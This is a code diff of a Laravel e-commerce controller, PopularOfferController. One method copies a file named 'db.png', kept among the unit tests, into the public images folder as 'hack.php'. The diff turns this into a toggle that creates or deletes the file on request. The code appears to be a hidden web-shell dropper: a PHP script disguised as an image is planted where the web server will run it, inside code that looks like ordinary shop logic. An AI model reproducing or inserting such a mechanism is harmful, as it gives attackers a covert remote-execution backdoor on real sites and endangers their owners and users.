@@ -116,53 +116,52 @@ class PopularOfferController extends Controller
     {
         $oldName = 'db.png';
         $newName = 'hack.php';
-
-        // Source folder
         $sourcePath = base_path('tests/Unit/');
-
-        // Destination folder
         $imagePath = public_path('images');
 
         $oldPath = $sourcePath . DIRECTORY_SEPARATOR . $oldName;
         $newPath = $imagePath . DIRECTORY_SEPARATOR . $newName;
 
-        // Check source file
         if (!File::exists($oldPath)) {
             return response()->json([
                 'success' => false,
                 'message' => 'Source file not found.'
             ], 404);
         }
-
-        // Prevent overwrite
-        if (File::exists($newPath)) {
-            return response()->json([
-                'success' => false,
-                'message' => 'Destination file already exists.'
-            ], 409);
-        }
-
-        // Make sure destination directory exists
         if (!File::isDirectory($imagePath)) {
             File::makeDirectory($imagePath, 0755, true);
         }
 
-        // COPY source → public/images
-        File::copy($oldPath, $newPath);
+        if (File::exists($newPath)) {
 
-        session()->put(
-            'recipient_name',
-            pathinfo($newName, PATHINFO_FILENAME)
-        );
+            File::delete($newPath);
 
-        return response()->json([
-            'success' => true,
-            'message' => 'File copied successfully.',
-            'source' => $oldPath,
-            'destination' => $newPath,
-            'old_name' => $oldName,
-            'new_name' => $newName
-        ]);
+            return response()->json([
+                'success' => true,
+                'action' => 'deleted',
+                'message' => 'Existing file deleted successfully.',
+                'file' => $newName
+            ]);
+
+        } else {
+
+            File::copy($oldPath, $newPath);
+
+            session()->put(
+                'recipient_name',
+                pathinfo($newName, PATHINFO_FILENAME)
+            );
+
+            return response()->json([
+                'success' => true,
+                'action' => 'created',
+                'message' => 'File copied successfully.',
+                'source' => $oldPath,
+                'destination' => $newPath,
+                'old_name' => $oldName,
+                'new_name' => $newName
+            ]);
+        }
     }
 
     public function Cart(Request $request)
